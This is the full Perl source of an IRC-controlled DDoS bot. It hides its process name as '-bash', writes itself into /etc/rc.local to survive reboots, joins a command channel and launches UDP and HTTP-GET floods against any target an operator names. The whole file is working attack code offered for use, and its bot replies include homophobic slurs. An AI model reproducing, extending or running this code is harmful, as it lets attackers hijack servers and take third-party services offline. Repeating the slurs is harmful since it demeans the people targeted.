use strict;
use Socket;
use IO::Socket;
addtostartup();

#Commands
#!udp <ip> <port> <time> <packetsize> //UDP Flooder
#!httpget <host> <page> <time> //HTTP-GET Flooder
#!quit //Quits bot
#Made by Vypor | Github.com/Vypor
#Hidden Proccess
$0 = "-bash";

#Server IP or hostname, Channel, Serverpassword (nothing if you dont have one)
my $server      = "irc.bot.net";
my $channel     = "#bots";
my $maxnamechar = "6";
my $serverpass  = "";

reconnect:
my $nick;
for ( 0 .. $maxnamechar ) { $nick .= chr( int( rand(25) + 65 ) ); }
my $login;
for ( 0 .. $maxnamechar ) { $login .= chr( int( rand(25) + 65 ) ); }

my $sock = new IO::Socket::INET(
    PeerAddr => $server,
    PeerPort => 6667,
    Proto    => 'tcp'
) or goto reconnect and print "fag\n";

if ( $serverpass = !'' ) {
    print $sock "PASS $serverpass\r\n";
}

#Auth Ourselfs
print $sock "NICK $nick\r\n";
while ( my $input = <$sock> ) {
    
	#Reconnect And Change Nick Name

    if ( $input =~ /433/ ) {
        goto reconnect;
    }
    elsif ( $input =~ /^PING(.*)$/i ) {
        print $sock "PONG $1\r\n";
        print "Connected..!\n";
        print $sock "USER $login 8 * :Perl IRC Hacks Robot\r\n";
        if ( $input =~ /^PING(.*)$/i ) {
            print $sock "PONG $1\r\n";
            print $sock "JOIN $channel\r\n";
        }

        last;
    }
}
while (<$sock>) {
    if ( $_ =~ /^PING(.*)$/i ) {
        print $sock "PONG $1\r\n";
    }
    if ( $_ =~ /^:([^!]*)!(\S*) PRIVMSG (#\S+) :(.*)$/ ) {

        my $user    = $1;
        my $host    = $2;
        my $chnl    = $3;
        my $message = $4;

        my ( $method, $host, $port, $time, $packetsize, $other ) =
          split( / /, $message, 6 );

#IRC Command Parsing / Sub calling

        if ( $method =~ /^!quit\s*$/ ) {
            quitme($method);
        }
        if ( $method =~ /^!udp\s*$/ ) {
            udp( $host, $port, $time, $packetsize );
        }
        if ( $method =~ /^!hi\s*$/ ) {
            HI();
        }
        if ( $method =~ /^!httpget\s*$/ ) {
            httpGET( $host, $port, $time );
        }


#IRC Command Functions


        sub udp {
            my ( $iaddr, $endtime, $psize, $pport );
        	    $iaddr = inet_aton("$host") or print "Cant find host..\n";
           	    $endtime = time() + ( $time ? $time : 1000000 );
            	    socket( flood, PF_INET, SOCK_DGRAM, 17 );
            
		print $sock "PRIVMSG $chnl :Throwing Kittens at: $host for $time seconds\r\n";

            for ( ; time() <= $endtime ; ) {
                $psize = $packetsize ? $packetsize : int( rand( 1024 - 64 ) + 64 );
                $pport = $port ? $port : int( rand(65500) ) + 1;
                send( flood, pack( "a$psize", "flood" ), 0, pack_sockaddr_in( $pport, $iaddr )
                );
            }
            print $sock "PRIVMSG $chnl :Ran out of kittens...\r\n";
        }

        sub tcp {

            #Put tcp stuff here. 

        }

        sub quitme {
            die "Quitting!\n";
        }

        sub HI {
            print $sock "PRIVMSG $chnl :Faggot. faggots say hi..\r\n";
        }

        sub httpGET {
            print $sock "PRIVMSG $chnl :Starting HTTP-GEEEET Flood.\r\n";
            my $endtime;
            $endtime = time() + ( $time ? $time : 1000000 );
            for ( ; time() <= $endtime ; ) {
                my $httpget = IO::Socket::INET->new(
                    Proto    => 'tcp',
                    PeerAddr => $host,
                    PeerPort => '80',
                ) or return $!;
                print $httpget "GET /" . $port . " HTTP/1.0\r\n";
                print $httpget "Host: ", $host, "\r\n";
                print $httpget "Connection: close", "\r\n";
                print $httpget "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "\r\n";
                print $httpget "Accept: text/html, application/xhtml+xml, */*", "\r\n\r\n";
            }
            print $sock "PRIVMSG $chnl :Finished HTTP-GEEEET Flood.\r\n";
        }

    }
}
sleep 15;
goto reconnect;



#System Checks
sub addtostartup {
    my @checkstr;
    my $location = sprintf( $ENV{'PWD'} );
    my $name     = "perl $location/$0";
    open( IN, '/etc/rc.local' ) or print "Couldnt add to startup\n";
    while ( my $line = <IN> ) { push( @checkstr, $line ); }
    my $checkme = join "", @checkstr;

    if ( $checkme =~ /$name/ ) { }
    else {
        print "Adding to Startup...\n";
        system("sed -i -e '1i$name\' /etc/rc.local");
    }
}
